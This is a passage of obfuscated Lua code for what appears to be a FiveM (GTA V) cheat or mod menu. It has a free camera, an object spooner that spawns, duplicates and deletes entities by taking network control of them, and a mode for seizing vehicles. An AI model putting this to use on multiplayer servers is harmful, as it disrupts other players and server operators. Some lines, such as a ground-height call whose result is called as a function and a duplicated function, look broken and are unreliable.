        if ld.suspensionRaise then
            SetVehicleHandlingFloat(X, "CHandlingData", "fSuspensionRaise", ld.suspensionRaise)
        end
    end
end
function StartPersonalVehicleCam()
    ClearFocus()
    local ia = PlayerPedId()
    I.OptionConfig.PersonalVehicleCam =
        CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", GetEntityCoords(ia), 0, 0, 0, 50.0 * 1.0)
    SetCamActive(I.OptionConfig.PersonalVehicleCam, true)
    RenderScriptCams(true, false, 0, true, false)
    SetCamAffectsAiming(I.OptionConfig.PersonalVehicleCam, false)
    AttachCamToEntity(I.OptionConfig.PersonalVehicleCam, I.OptionConfig.PersonalVehicle, 0.0, -6.6, 1.2, true)
end
function EndPersonalVehicleCam()
    ClearFocus()
    RenderScriptCams(false, false, 0, true, false)
    DestroyCam(I.OptionConfig.PersonalVehicleCam, false)
    SetFocusEntity(PlayerPedId())
    I.OptionConfig.PersonalVehicleCam = nil
end
local offsetRotX = 0.0
local offsetRotY = 0.0
local offsetRotZ = 0.0
local offsetCoords = {}
offsetCoords.x = 0.0
offsetCoords.y = 0.0
offsetCoords.z = 0.0
local lf = 0
local precision = 1.0
local lg
local lh = {}
local speed = 1.0
local li = 1
local lj = 10
local lk = {}
for b7 = 0.1, 2.01, 0.1 do
    d.Main.GuestTable.GuestInsert(
        lk,
        d.Main.GuestToString(b7)
    )
end
local charControl = false
local isAttached = false
local entity
local hk
local pointEntity = false
local ll
local lm
local ln
local lo
local lp
local lq = {
    {["label"] = "Ouvrir le menu", ["button"] = "~INPUT_ENTER~"},
    {["label"] = "Freecam rapide", ["button"] = "~INPUT_SPRINT~"},
    {["label"] = "Editer", ["button"] = "~INPUT_AIM~"},
    {["label"] = "Supprimer", ["button"] = "~INPUT_CREATOR_DELETE~"},
    {["label"] = "Dupliquer", ["button"] = "~INPUT_LOOK_BEHIND~"},
    {["label"] = "Ajoute un objet", ["button"] = "~INPUT_REPLAY_STARTPOINT~"},
    {["label"] = "Créer un véhicule", ["button"] = "~INPUT_PICKUP~"}
}
local lr = {
    {["label"] = "Freecam rapide", ["button"] = "~INPUT_SPRINT~"},
    {["label"] = "Se donner le véhicule", ["button"] = "~INPUT_CONTEXT_SECONDARY~"},
    {["label"] = "Se télèporter dans le véhicule", ["button"] = "~INPUT_MULTIPLAYER_INFO~"}
}
function GetGroundZAtCoords(x, y)
    for b7 = 1, 500 do
        local retval, z, ls = GetGroundZAndNormalFor_3dCoord(x, y, b7)
        print(ls)
        if retval == 1 then
            return z
        end
    end
end
d.Main.GuestThread(
    function()
        while not killmenu do
            if D then
                if B then
                    bbe679b6dacb3e2016befe41e2f494f1()
                end
                d5087ddda1a3582a85eca1565579a()
                if E == "Object Spooner" then
                    if GetEntityInFrontOfCam() == 0 then
                        I.DrawRect(0.5, 0.5, 0.00075, 0.035, {r = 255, g = 255, b = 255, a = 200})
                        I.DrawRect(0.5, 0.5, 0.02, 0.0035, {r = 255, g = 255, b = 255, a = 200})
                    else
                        I.DrawRect(0.5, 0.5, 0.00075, 0.035, {r = 0, g = 255, b = 0, a = 200})
                        I.DrawRect(0.5, 0.5, 0.02, 0.0035, {r = 0, g = 255, b = 0, a = 200})
                        local lt = GetEntityInFrontOfCam()
                        local lu = GetModelDimensions(lt)
                        local lv = GetEntityCoords(lt)
                        if lu ~= nil then
                            attempt1 = GetOffsetFromEntityInWorldCoords(lt, lu.x, lu.y, lu.z)
                            attempt2 = GetOffsetFromEntityInWorldCoords(lt, -lu.x, lu.y, lu.z)
                            attempt3 = GetOffsetFromEntityInWorldCoords(lt, lu.x, lu.y, -lu.z + -lu.z / 2 + 0.1)
                            attempt4 = GetOffsetFromEntityInWorldCoords(lt, -lu.x, lu.y, -lu.z + -lu.z / 2 + 0.1)
                            attempt5 = GetOffsetFromEntityInWorldCoords(lt, lu.x, -lu.y, -lu.z + -lu.z / 2 + 0.1)
                            attempt6 = GetOffsetFromEntityInWorldCoords(lt, lu.x, -lu.y, -lu.z + -lu.z / 2 + 0.1)
                            attempt7 = GetOffsetFromEntityInWorldCoords(lt, -lu.x, -lu.y, -lu.z + -lu.z / 2 + 0.1)
                            attempt8 = GetOffsetFromEntityInWorldCoords(lt, -lu.x, -lu.y, -lu.z + -lu.z / 2 + 0.1)
                            attempt9 = GetOffsetFromEntityInWorldCoords(lt, -lu.x, -lu.y, lu.z)
                            attempt10 = GetOffsetFromEntityInWorldCoords(lt, lu.x, -lu.y, lu.z)
                            DrawLine(
                                attempt1.x,
                                attempt1.y,
                                attempt1.z,
                                attempt2.x,
                                attempt2.y,
                                attempt2.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt3.x,
                                attempt3.y,
                                attempt3.z,
                                attempt4.x,
                                attempt4.y,
                                attempt4.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt3.x,
                                attempt3.y,
                                attempt3.z,
                                attempt6.x,
                                attempt6.y,
                                attempt6.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt4.x,
                                attempt4.y,
                                attempt4.z,
                                attempt5.x,
                                attempt5.y,
                                attempt5.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt3.x,
                                attempt3.y,
                                attempt3.z,
                                attempt7.x,
                                attempt7.y,
                                attempt7.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt4.x,
                                attempt4.y,
                                attempt4.z,
                                attempt8.x,
                                attempt8.y,
                                attempt8.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt4.x,
                                attempt4.y,
                                attempt4.z,
                                attempt8.x,
                                attempt8.y,
                                attempt8.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt6.x,
                                attempt6.y,
                                attempt6.z,
                                attempt8.x,
                                attempt8.y,
                                attempt8.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt1.x,
                                attempt1.y,
                                attempt1.z,
                                attempt3.x,
                                attempt3.y,
                                attempt3.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt2.x,
                                attempt2.y,
                                attempt2.z,
                                attempt4.x,
                                attempt4.y,
                                attempt4.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt1.x,
                                attempt1.y,
                                attempt1.z,
                                attempt9.x,
                                attempt9.y,
                                attempt9.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt2.x,
                                attempt2.y,
                                attempt2.z,
                                attempt10.x,
                                attempt10.y,
                                attempt10.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt10.x,
                                attempt10.y,
                                attempt10.z,
                                attempt8.x,
                                attempt8.y,
                                attempt8.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt2.x,
                                attempt2.y,
                                attempt2.z,
                                attempt9.x,
                                attempt9.y,
                                attempt9.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt10.x,
                                attempt10.y,
                                attempt10.z,
                                attempt9.x,
                                attempt9.y,
                                attempt9.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt1.x,
                                attempt1.y,
                                attempt1.z,
                                attempt10.x,
                                attempt10.y,
                                attempt10.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt1.x,
                                attempt1.y,
                                attempt1.z,
                                attempt4.x,
                                attempt4.y,
                                attempt4.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt2.x,
                                attempt2.y,
                                attempt2.z,
                                attempt3.x,
                                attempt3.y,
                                attempt3.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt9.x,
                                attempt9.y,
                                attempt9.z,
                                attempt8.x,
                                attempt8.y,
                                attempt8.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt10.x,
                                attempt10.y,
                                attempt10.z,
                                attempt6.x,
                                attempt6.y,
                                attempt6.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt9.x,
                                attempt9.y,
                                attempt9.z,
                                attempt6.x,
                                attempt6.y,
                                attempt6.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt6.x,
                                attempt6.y,
                                attempt6.z,
                                attempt1.x,
                                attempt1.y,
                                attempt1.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt7.x,
                                attempt7.y,
                                attempt7.z,
                                attempt2.x,
                                attempt2.y,
                                attempt2.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt9.x,
                                attempt9.y,
                                attempt9.z,
                                attempt4.x,
                                attempt4.y,
                                attempt4.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                            DrawLine(
                                attempt10.x,
                                attempt10.y,
                                attempt10.z,
                                attempt3.x,
                                attempt3.y,
                                attempt3.z,
                                I.rgb.r,
                                I.rgb.g,
                                I.rgb.b,
                                255
                            )
                        end
                    end
                    local coords = fa273d3dbc025e4f6212452d7ce66898()
                    local retval, lw, ls = GetGroundZAndNormalFor_3dCoord(coords.x, coords.y, coords.z + 100)(lq)
                    if IsDisabledControlJustReleased(0, 23) then
                        I.OpenMenu("objectslist")
                    end
                    if IsDisabledControlJustReleased(0, 38) then
                        I.ba324546()
                        I.ba324546()
                        local lx = I.KeyboardEntry("~b~Nom du véhicule :", 50)
                        if IsModelAVehicle(lx) then
                            e087206cc908106f5b9548005fa39fd(
                                GetHashKey(lx),
                                coords.x,
                                coords.y,
                                coords.z,
                                GetCamRot(D, 2)[3],
                                1,
                                1
                            )
                        else
                            PushNotification("Le nom du véhicule n'existe pas :", 600)
                        end
                        I.OpenMenu("objectslist")
                    end
                    if IsDisabledControlJustReleased(0, 26) then
                        local entity = GetEntityInFrontOfCam()
                        if entity ~= 0 and DoesEntityExist(entity) and GetEntityType(entity) ~= 0 or nil then
                            local ly = GetEntityModel(entity)
                            cords = GetEntityCoords(entity)
                            if IsModelAVehicle(ly) then
                                e087206cc908106f5b9548005fa39fd(
                                    ly,
                                    cords.x,
                                    cords.y,
                                    cords.z,
                                    GetEntityHeading(entity),
                                    1,
                                    1
                                )
                            elseif IsEntityAPed(entity) then
                                pud = CreatePed(5, ly, cords.x, cords.y, cords.z, GetEntityHeading(entity), 1, 1)
                                TaskWanderStandard(pud, 10.0, 10)
                            end
                        end
                    end
                    if IsDisabledControlPressed(0, 305) then
                        local entity = GetEntityInFrontOfCam()
                        if DoesEntityExist(entity) and not IsEntityAlreadyAdded(entity) then
                            if entity ~= PlayerPedId() and entity ~= IsPedAPlayer(entity) then
                                local lz = {
                                    ID = entity,
                                    AttachedEntity = nil,
                                    AttachmentOffset = {X = 0, Y = 0, Z = 0, XAxis = 0, YAxis = 0, ZAxis = 0}
                                }
                                d.Main.GuestTable.GuestInsert(
                                    I.Objectlist,
                                    #I.Objectlist + 1,
                                    lz
                                )
                            end
                        end
                    end
                    if IsDisabledControlPressed(0, 229) then
                        if GetEntityInFrontOfCam() ~= 0 then
                            I.DrawRect(0.5, 0.5, 0.005, 0.0075, {r = 255, g = 128, b = 0, a = 200})
                        end
                    end
                    if IsDisabledControlJustReleased(0, 256) then
                        if
                            GetEntityInFrontOfCam() ~= PlayerPedId() and
                                GetEntityInFrontOfCam() ~= IsPedAPlayer(GetEntityInFrontOfCam())
                         then
                            if TableHasValue(spawnedobjectslist, GetEntityInFrontOfCam()) then
                                RemoveValueFromTable(spawnedobjectslist, GetEntityInFrontOfCam())
                            end
                            NetworkRequestControlOfEntity(GetEntityInFrontOfCam())
                            RequestControlOnce(GetEntityInFrontOfCam())
                            DeleteEntity(GetEntityInFrontOfCam())
                        end
                    end
                elseif E == "Steal a car in freecam" then
                    if GetEntityInFrontOfCam() == 0 then
                        I.DrawRect(0.5, 0.5, 0.00075, 0.035, {r = 255, g = 255, b = 255, a = 200})
                        I.DrawRect(0.5, 0.5, 0.02, 0.0035, {r = 255, g = 255, b = 255, a = 200})
                    else
                        I.DrawRect(0.5, 0.5, 0.00075, 0.035, {r = 0, g = 255, b = 0, a = 200})
                        I.DrawRect(0.5, 0.5, 0.02, 0.0035, {r = 0, g = 255, b = 0, a = 200})
                    end
                    if IsDisabledControlJustReleased(0, 52) then
                        if IsEntityAVehicle(GetEntityInFrontOfCam()) then
                            if IsPedInAnyVehicle(PlayerPedId()) then
                                oldveh = GetVehiclePedIsIn(PlayerPedId(), true)
                                Wait(10)
                                SetPedIntoVehicle(PlayerPedId(), GetEntityInFrontOfCam(), -1)
                                I.OptionConfig.PersonalVehicle = GetEntityInFrontOfCam()
                                Wait(10)
                                if IsVehicleSeatFree(oldveh, -1) then
                                    SetPedIntoVehicle(PlayerPedId(), oldveh, -1)
                                elseif IsVehicleSeatFree(oldveh, 0) then
                                    SetPedIntoVehicle(PlayerPedId(), oldveh, 0)
                                elseif IsVehicleSeatFree(oldveh, 1) then
                                    SetPedIntoVehicle(PlayerPedId(), oldveh, 1)
                                elseif IsVehicleSeatFree(oldveh, 2) then
                                    SetPedIntoVehicle(PlayerPedId(), oldveh, 2)
                                end
                            else
                                coords = GetEntityCoords(PlayerPedId())
                                SetPedIntoVehicle(PlayerPedId(), GetEntityInFrontOfCam(), -1)
                                I.OptionConfig.PersonalVehicle = GetEntityInFrontOfCam()
                                c3188c79a068242c231f422e25ebbae(PlayerPedId(), coords)
                            end
                        end
                    elseif IsDisabledControlPressed(0, 20) then
                        if IsEntityAVehicle(GetEntityInFrontOfCam()) then
                            if IsVehicleSeatFree(GetEntityInFrontOfCam(), -1) then
                                SetPedIntoVehicle(PlayerPedId(), GetEntityInFrontOfCam(), -1)
                            elseif IsVehicleSeatFree(GetEntityInFrontOfCam(), 0) then
                                SetPedIntoVehicle(PlayerPedId(), GetEntityInFrontOfCam(), 0)
                            elseif IsVehicleSeatFree(GetEntityInFrontOfCam(), 1) then
                                SetPedIntoVehicle(PlayerPedId(), GetEntityInFrontOfCam(), 1)
                            elseif IsVehicleSeatFree(GetEntityInFrontOfCam(), 2) then
                                SetPedIntoVehicle(PlayerPedId(), GetEntityInFrontOfCam(), 2)
                            end
                        end
                    end
                end
            end
            d.Main.GuestWait(1)
        end
    end
)
function DrawBottomHelp(table)
    d.Main.GuestThread(
        function()
            local lA = RequestScaleformMovie("instructional_buttons")
            while not HasScaleformMovieLoaded(lA) do
                Wait(0)
            end
            PushScaleformMovieFunction(lA, "CLEAR_ALL")
            PushScaleformMovieFunction(lA, "TOGGLE_MOUSE_BUTTONS")
            PushScaleformMovieFunctionParameterBool(0)
            PopScaleformMovieFunctionVoid()
            for lB, lC in ipairs(table) do
                PushScaleformMovieFunction(lA, "SET_DATA_SLOT")
                PushScaleformMovieFunctionParameterInt(lB - 1)
                PushScaleformMovieMethodParameterButtonName(lC["button"])
                PushScaleformMovieFunctionParameterString(lC["label"])
                PopScaleformMovieFunctionVoid()
            end
            PushScaleformMovieFunction(lA, "DRAW_INSTRUCTIONAL_BUTTONS")
            PushScaleformMovieFunctionParameterInt(-1)
            PopScaleformMovieFunctionVoid()
            DrawScaleformMovieFullscreen(lA, 255, 255, 255, 255)
        end
    )
end
function f2d640737d4432402aea6bcbdc90252(jC)
    ClearFocus()
    local ia = PlayerPedId()
    D = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", GetEntityCoords(ia), 0, 0, 0, jC * 1.0)
    SetCamActive(D, true)
    RenderScriptCams(true, false, 0, true, false)
    SetCamAffectsAiming(D, false)
    if isAttached and DoesEntityExist(entity) then
        offsetCoords = GetOffsetFromEntityGivenWorldCoords(entity, GetCamCoord(D))
        AttachCamToEntity(D, entity, offsetCoords.x, offsetCoords.y, offsetCoords.z, true)
    end
end
function fc858f4ad9b7e9c12fcddc1e6ae220a6()
    ClearFocus()
    RenderScriptCams(false, false, 0, true, false)
    DestroyCam(D, false)
    SetFocusEntity(PlayerPedId())
    offsetRotX = 0.0
    offsetRotY = 0.0
    offsetRotZ = 0.0
    isAttached = false
    speed = 1.0
    precision = 1.0
    currFov = GetGameplayCamFov()
    D = nil
end
disabledControls = {
    30,
    31,
    21,
    36,
    22,
    44,
    38,
    71,
    72,
    59,
    60,
    85,
    86,
    15,
    14,
    37,
    80,
    228,
    229,
    172,
    173,
    37,
    44,
    178,
    244
}
function d5087ddda1a3582a85eca1565579a()
    local ia = PlayerPedId()
    DisableFirstPersonCamThisFrame()
    BlockWeaponWheelThisFrame()
    if not charControl then
        for h, i in pairs(disabledControls) do
            DisableControlAction(0, i, true)
        end
    end
    if IsDisabledControlJustReleased(0, 82) or IsDisabledControlJustReleased(0, 81) then
        if E == "Object Spooner" then
            E = "Vehicle Snatcher"
        elseif E == "Vehicle Snatcher" then
            E = "Object Spooner"
        end
    end
    local hk = GetCamCoord(D)
    local jD = d235cdc1b60b38f7490664fe8e54a020(hk.x, hk.y, hk.z)
    SetFocusArea(jD.x, jD.y, jD.z, 0.0, 0.0, 0.0)
    SetCamCoord(D, jD.x, jD.y, jD.z)
    SetMinimapHideFow(false)
    SetCamRot(D, offsetRotX, offsetRotY, offsetRotZ, 2)
end
function d235cdc1b60b38f7490664fe8e54a020(x, y, z)
    local _x = x
    local _y = y
    local jE = z
    if IsInputDisabled(0) and not charControl then
        if IsDisabledControlPressed(1, 32) then
            local jF = Sin(offsetRotZ)
            local jG = Cos(offsetRotZ)
            local jH = Sin(offsetRotX)
            _x = _x - 0.1 * speed * jF
            _y = _y + 0.1 * speed * jG
            jE = jE + 0.1 * speed * jH
        end
        if IsDisabledControlPressed(1, 33) then
            local jF = Sin(offsetRotZ)
            local jG = Cos(offsetRotZ)
            local jH = Sin(offsetRotX)
            _x = _x + 0.1 * speed * jF
            _y = _y - 0.1 * speed * jG
            jE = jE - 0.1 * speed * jH
        end
        if IsDisabledControlPressed(1, 34) then
            local jF = Sin(offsetRotZ + 90.0)
            local jG = Cos(offsetRotZ + 90.0)
            local jH = Sin(offsetRotY)
            _x = _x - 0.1 * speed * jF
            _y = _y + 0.1 * speed * jG
            jE = jE + 0.1 * speed * jH
        end
        if IsDisabledControlPressed(1, 35) then
            local jF = Sin(offsetRotZ + 90.0)
            local jG = Cos(offsetRotZ + 90.0)
            local jH = Sin(offsetRotY)
            _x = _x + 0.1 * speed * jF
            _y = _y - 0.1 * speed * jG
            jE = jE - 0.1 * speed * jH
        end
        if IsDisabledControlPressed(0, 21) then
            speed = 15.0
        else
            speed = 2.0
        end
        offsetRotX = offsetRotX - GetDisabledControlNormal(1, 2) * precision * 8.0
        offsetRotZ = offsetRotZ - GetDisabledControlNormal(1, 1) * precision * 8.0
    end
    if offsetRotX > 90.0 then
        offsetRotX = 90.0
    elseif offsetRotX < -90.0 then
        offsetRotX = -90.0
    end
    if offsetRotY > 90.0 then
        offsetRotY = 90.0
    elseif offsetRotY < -90.0 then
        offsetRotY = -90.0
    end
    if offsetRotZ > 360.0 then
        offsetRotZ = offsetRotZ - 360.0
    elseif offsetRotZ < -360.0 then
        offsetRotZ = offsetRotZ + 360.0
    end
    return {x = _x, y = _y, z = jE}
end
function b20af3603344e312ec1a6e84bfbefce2(jI, jC)
    if jI then
        f2d640737d4432402aea6bcbdc90252(jC)
        _menuPool:RefreshIndex()
    else
        fc858f4ad9b7e9c12fcddc1e6ae220a6()
        _menuPool:RefreshIndex()
    end
end
function GetEntityInFrontOfCam()
    local hk = GetCamCoord(D)
    local fW = GetCamCoord(D) + lpdfiodsjqshudvazaerz(GetCamRot(D, 2)) * 40
    local jJ = StartShapeTestRay(hk.x, hk.y, hk.z, fW.x, fW.y, fW.z, -1)
    local a, b, eW, eX, entity = GetShapeTestResult(jJ)
    return entity
end
function GetEntityInFrontOfCam()
    local hk = GetCamCoord(D)
    local fW = GetCamCoord(D) + lpdfiodsjqshudvazaerz(GetCamRot(D, 2)) * 40
    local jJ = StartShapeTestRay(hk.x, hk.y, hk.z, fW.x, fW.y, fW.z, -1)
    local a, b, eW, eX, entity = GetShapeTestResult(jJ)
    return entity
end
function d1179e95692305fbf09b7ca874()
    local hk = GetCamCoord(D)
    local fW = GetCamCoord(D) + lpdfiodsjqshudvazaerz(GetCamRot(D, 2)) * 40
    local jJ = StartShapeTestRay(hk.x, hk.y, hk.z, fW.x, fW.y, fW.z, -1)
    local a, b, eW, eX, entity = GetShapeTestResult(jJ)
    return entity
end
function fa273d3dbc025e4f6212452d7ce66898()
    Markerloc = GetCamCoord(D) + lpdfiodsjqshudvazaerz(GetCamRot(D, 2)) * 20
    return Markerloc
end
function e98f2ffae8b8c3a295f4bc4()
    if not isAttached then
        entity = GetEntityInFrontOfCam()
        if DoesEntityExist(entity) then
            offsetCoords = GetOffsetFromEntityGivenWorldCoords(entity, GetCamCoord(D))
            d.Main.GuestWait(1)
            local hk = GetCamCoord(D)
            AttachCamToEntity(D, entity, GetOffsetFromEntityInWorldCoords(entity, hk.x, hk.y, hk.z), true)
            isAttached = true
        end
    else
        ClearFocus()
        DetachCam(D)
        isAttached = false
    end
end
function f9f10ee563488a8a39f537f6387e4d72(jI)
    if jI and isAttached then
        pointEntity = true
        PointCamAtEntity(D, entity, 0.0, 0.0, 0.0, 1)
    else
        pointEntity = false
        StopCamPointing(D)
    end
end

--bäärs#3150